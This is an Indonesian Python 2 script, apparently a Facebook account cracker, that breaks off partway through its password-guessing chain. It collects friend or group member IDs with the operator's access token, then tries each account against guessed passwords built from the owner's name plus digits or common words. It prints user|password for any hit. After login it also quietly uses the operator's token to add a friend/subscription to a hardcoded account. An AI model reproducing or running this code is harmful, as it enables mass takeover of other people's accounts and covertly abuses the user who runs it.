
# -*- coding: utf-8 -*-
# mau ngapain bro mau recode ea buat sendiri lah bgst

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91m[!] Closed'
    os.sys.exit()

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()

logo = """█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█ █████████                               █
█ █▄█████▄█ ╔═══╗ ╔═══╗ ╔═══╗ ╔═══╗ ╔╗╔═╗ █
█ █▼▼▼▼▼    ║╔═╗║ ║╔═╗║ ║╔═╗║ ║╔═╗║ ║║║╔╝ █
█ █         ║║ ╚╝ ║╚═╝║ ║║ ║║ ║║ ╚╝ ║╚╝╝  █
█ █▲▲▲▲▲    ║║ ╔╗ ║╔╗╔╝ ║╚═╝║ ║║ ╔╗ ║╔╗║  █
█ █████████ ║╚═╝║ ║║║╚╗ ║╔═╗║ ║╚═╝║ ║║║╚╗ █
█  ██ ██    ╚═══╝ ╚╝╚═╝ ╚╝ ╚╝ ╚═══╝ ╚╝╚═╝ █ \x1b[1;93mBeta Version
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
\033[1;91m╔═════════════════════════════════════════════╗
\033[1;91m║\033[1;93m* \033[1;97mAuthor  \033[1;91m: \033[1;33m[Egi Setiawan] \033[1;91m                  ║
\033[1;91m║\033[1;93m* \033[1;97mGitHub  \033[1;91m: \033[1;92m[https//:github.com/EgiRecod] \033[1;91m   ║
\033[1;94m║\033[1;93m* \033[1;97mSupport \033[1;91m: \033[1;98m[Ortu] \033[1;95m[Keluarga] \033[1;96m[Allah SWT] \033[1;95m   ║
\033[1;94m╚═══════════════════════\033[1;95m══════════════════════╝"""

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading\x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print "█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█"
        print '█      ╦ ╦╔╗╦ ╔╗╔╗╔╦╗╔╗      █'
        print '█      ║║║╠ ║ ║ ║║║║║╠       █'
        print '█      ╚╩╝╚╝╚╝╚╝╚╝╩ ╩╚╝      █'
        print '█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█'
        print 55 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91mLOGIN AKUN FB DULU BOSQU'
        print 55 * '\x1b[1;97m═'
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FB \x1b[1;91m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mEmail|ID \x1b[1;91m:\x1b[1;92m ')
        pwd = raw_input('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] Tidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                print '\n\x1b[1;96mSELAMAT MEMAKAI SC NYA ^_^'
                time.sleep(2.5)
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(1)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] Tidak ada koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
            os.system('rm -rf login.txt')
            keluar()
        else:
            print '\n\x1b[1;91m[!] Login Gagal'
            os.system('rm -rf login.txt')
            login()

def menu():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint'
            os.system('rm -rf login.txt')
            login()
        except requests.exceptions.ConnectionError:
            print logo
            print '\x1b[1;91m[!] Tidak Ada Koneksi'
            keluar()


    os.system('clear')
    print logo
    print '\x1b[1;93m\xe2\x95\x94' + 50 * '\xe2\x95\x90' + '╗'
    print '\xe2\x95\x91\x1b[1;93m[\x1b[1;93m\xe2\x9c\x93\x1b[1;93m]\x1b[1;93m Nama       \x1b[1;93m: \x1b[1;92m' + nama + (33 - len(nama)) * '\x1b[1;93m ' + '║'
    print '\xe2\x95\x91\x1b[1;93m[\x1b[1;93m\xe2\x9c\x93\x1b[1;93m]\x1b[1;93m ID FB SAYA \x1b[1;93m: \x1b[1;92m' + id + (33 - len(id)) * '\x1b[1;93m ' + '║'
    print '\xe2\x95\x91\x1b[1;93m[\x1b[1;93m\xe2\x9c\x93\x1b[1;93m]\x1b[1;93m Followers  \x1b[1;93m: \x1b[1;92m' + sub + (33 - len(sub)) * '\x1b[1;93m ' + '║'
    print '\x1b[1;93m╠' + 50* '\xe2\x95\x90' + '║'
    print '║-» \x1b[1;36;49m1. Auto Crack                                  \x1b[1;93m║'
    print '║-» \x1b[1;36;49m2. Manual Crack                                \x1b[1;93m║'
    print '║-» \x1b[1;36;49m3. Id Group                                    \x1b[1;93m║'
    print '║-» \x1b[1;36;49m4. Ambil ID/Email/Hp Teman                     \x1b[1;93m║'
    print '║-» \x1b[1;36;49m5. Ganti Akun                                  \x1b[1;93m║'
    print '║-» \x1b[1;36;49m0. Keluar                                      \x1b[1;93m║'
    print '\x1b[1;93m╠' + 50* '\xe2\x95\x90' + '╝'
    pilih()


def pilih():
    zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;93m ')    
    if zedd == '':
        print "\x1b[1;91m[!] Can't empty"
        pilih()
    else:
        if zedd == '1':
            autocrack()
        else:
            if zedd == '2':
                manualcrack()
            else:
                if zedd == '3':
                    group()
                else:
                    if zedd == '4':
                        grab()
                    else:
                        if zedd == '5':
                            os.system('rm -rf login.txt')
                            keluar()
                        else:
                            if zedd == '0':
                                keluar()
                            else:
                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mNot availabel'
                                pilih()


def autocrack():
       global toket
       os.system('clear')
       try:
        toket = open('login.txt', 'r').read()
       except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

       os.system('clear')
       print logo
       print '\x1b[1;93m\xe2\x95\x94' + 50 * '\xe2\x95\x90' + '╗'
       print '\xe2\x95\x91\x1b\xe2\x9c\x93\x1b[1;93m{Menu Crack} \x1b[1;93m                                     ║'
       print '\x1b[1;93m╠' + 50 * '\xe2\x95\x90' + '╝'
       print '║-> \x1b[1;93m 1. Crack from Friends'
       print '║-> \x1b[1;93m 2. Crack from Group'
       print '║-> \x1b[1;31;40m 0. Kembali'
       print '\x1b[1;93m║'
       pilih_super()


def pilih_super():
    peak = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if peak == '':
        print '\x1b[1;91m[!] Jangan kosong'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print 55 * '\x1b[1;97m\xe2\x95\x90'
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id teman \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print 55 * '\x1b[1;97m\xe2\x95\x90'
                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '\x1b[1;91m[!] Grup tidak ditemukan'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                    super()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '0':
                    menu()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                    pilih_super()
    print '\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
        sys.stdout.flush()

    print 55 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;95mSemoga Banyak Dapat Akun Nya ^_^'
    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|'+ pass1+'==>' + b['name']
                print 55 * '\x1b[1;97m\xe2\x95\x90'
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass1 +'==>' + b['name']
                    print 55 * '\x1b[1;97m\xe2\x95\x90'
                else:               
                    pass2 = b['first_name'] + '1234'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass2 +'==>' + b['name']
                        print 55 * '\x1b[1;97m\xe2\x95\x90'
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass2 +'==>' + b['name']
                            print 55 * '\x1b[1;97m\xe2\x95\x90'
                        else:
                           pass3 = b['first_name'] + '12345'
                           data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                           q = json.load(data)
                           if 'access_token' in q:
                               print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass3 +'==>' + b['name']                              
                               print 55 * '\x1b[1;97m\xe2\x95\x90'
                           else:
                               if 'www.facebook.com' in q['error_msg']:
                                   print '\x1b[1;93m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass3 +'==>' + b['name']
                                   print 55 * '\x1b[1;97m\xe2\x95\x90'
                               else:
                                  pass4 = b['first_name'] + '12356'
                                  data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                  q = json.load(data)
                                  if 'access_token' in q:
                                      print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass4 +'==>' + b['name']
                                      print 55 * '\x1b[1;97m\xe2\x95\x90'
                                  else:
                                      if 'www.facebook.com' in q['error_msg']:
                                          print '\x1b[1;93m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass4 +'==>' + b['name']
                                          print 55 * '\x1b[1;97m\xe2\x95\x90'
                                      else:
                                         pass5 = b['last_name'] + '123'
                                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                         q = json.load(data)
                                         if 'access_token' in q:
                                             print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass5 +'==>' + b['name']
                                             print 55 * '\x1b[1;97m\xe2\x95\x90'
                                         else:
                                             if 'www.facebook.com' in q['error_msg']:
                                                 print '\x1b[1;93m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass5 +'==>' + b['name']
                                                 print 55 * '\x1b[1;97m\xe2\x95\x90'
                                             else:
                                                pass6 = b['last_name'] + '1234'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass6 +'==>' + b['name']                                               
                                                    print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                else:
                                                    if 'www.facebook.com' in q['error_msg']:
                                                        print '\x1b[1;93m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass6 +'==>' + b['name']
                                                        print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                    else:
                                                       pass7 = b['last_name'] + '12345'
                                                       data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                       q = json.load(data)
                                                       if 'access_token' in q:
                                                           print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass7 +'==>' + b['name']                                               
                                                           print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                       else:
                                                           if 'www.facebook.com' in q['error_msg']:
                                                               print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass7 +'==>' + b['name']
                                                               print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                           else:
                                                              pass8 = b['last_name'] + '123456'
                                                              data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                              q = json.load(data)
                                                              if 'access_token' in q:
                                                                  print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass8 +'==>' + b['name']                                               
                                                                  print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                              else:
                                                                  if 'www.facebook.com' in q['error_msg']:
                                                                      print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass8 +'==>' + b['name']
                                                                      print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                  else:
                                                                     pass9 = 'sayang'
                                                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                     q = json.load(data)
                                                                     if 'access_token' in q:
                                                                         print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass9 +'==>' + b['name']                                               
                                                                         print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                     else:
                                                                         if 'www.facebook.com' in q['error_msg']:
                                                                             print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass9 +'==>' + b['name']
                                                                             print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                         else:
                                                                            pass10 = 'anjing'
                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                            q = json.load(data)
                                                                            if 'access_token' in q:
                                                                                print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass10 +'==>' + b['name']                                               
                                                                                print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                            else:
                                                                                if 'www.facebook.com' in q['error_msg']:
                                                                                    print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass10 +'==>' + b['name']
                                                                                    print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                else:
                                                                                   pass11 = 'bangsat'
                                                                                   data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                   q = json.load(data)
                                                                                if 'access_token' in q:
                                                                                    print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass11 +' ==> ' + b['name']                                               
                                                                                    print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                else:
                                                                                    if 'www.facebook.com' in q['error_msg']:
                                                                                        print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass11 +' ==> ' + b['name']
                                                                                        print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                    else:
                                                                                       pass12 = 'freefire'
                                                                                       data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                       q = json.load(data)
                                                                                       if 'access_token' in q:
                                                                                           print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass12 +' ==> ' + b['name']                                               
                                                                                           print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                       else:
                                                                                           if 'www.facebook.com' in q['error_msg']:
                                                                                               print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass12 +' ==> ' + b['name'] 
                                                                                               print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                           else:
                                                                                              pass13 = 'doraemon'
                                                                                              data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                              q = json.load(data)
                                                                                              if 'access_token' in q:
                                                                                                  print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass13 +' ==> ' + b['name']                                               
                                                                                                  print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                              else:
                                                                                                  if 'www.facebook.com' in q['error_msg']:
                                                                                                      print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass13 +' ==> ' + b['name'] 
                                                                                                      print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                  else:
                                                                                                     pass14 = 'januari'
                                                                                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                     q = json.load(data)
                                                                                                     if 'access_token' in q:
                                                                                                         print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass14 +' ==> ' + b['name']                                               
                                                                                                         print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                     else:
                                                                                                         if 'www.facebook.com' in q['error_msg']:
                                                                                                             print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass14 +' ==> ' + b['name'] 
                                                                                                             print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                         else:
                                                                                                            pass15 = 'password',
                                                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                            q = json.load(data)
                                                                                                            if 'access_token' in q:
                                                                                                                print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass15 +' ==> ' + b['name']                                               
                                                                                                                print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                            else:
                                                                                                                if 'www.facebook.com' in q['error_msg']:
                                                                                                                    print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass15 +' ==> ' + b['name'] 
                                                                                                                    print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                else:
                                                                                                                   pass16 = 'persija123'
                                                                                                                   data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                                   q = json.load(data)
                                                                                                                   if 'access_token' in q:
                                                                                                                       print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass16 +' ==> ' + b['name']                                               
                                                                                                                       print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                   else:
                                                                                                                       if 'www.facebook.com' in q['error_msg']:
                                                                                                                           print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass16 +' ==> ' + b['name'] 
                                                                                                                           print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                       else:
                                                                                                                          pass17 = 'indonesia'
                                                                                                                          data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass17 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                                          q = json.load(data)
                                                                                                                          if 'access_token' in q:
                                                                                                                              print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass17 +' ==> ' + b['name']                                               
                                                                                                                              print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                          else:
                                                                                                                              if 'www.facebook.com' in q['error_msg']:
                                                                                                                                  print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass17 +' ==> ' + b['name'] 
                                                                                                                                  print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                              else:
                                                                                                                                 pass18 = 'tidakada'
                                                                                                                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass18 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                                                 q = json.load(data)
                                                                                                                                 if 'access_token' in q:
                                                                                                                                     print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass18 +' ==> ' + b['name']                                               
                                                                                                                                     print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                                 else:
                                                                                                                                      if 'www.facebook.com' in q['error_msg']:
                                                                                                                                          print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass18 +' ==> ' + b['name'] 
                                                                                                                                          print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                                      else:
                                                                                                                                          pass19 = b['first_name'] + b['last_name']
                                                                                                                                          data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass19 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                                                          q = json.load(data)
                                                                                                                                          if 'access_token' in q:
                                                                                                                                              print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user + ' | ' + pass19 +' ==> ' + b['name']                                               
                                                                                                                                              print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                                          else:
                                                                                                                                               if 'www.facebook.com' in q['error_msg']:
                                                                                                                                                   print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass19 +' ==> ' + b['name'] 
                                                                                                                                               else:
                                                                                                                                                   pass20 = b['first_name'] + b['last_name'] + '123'
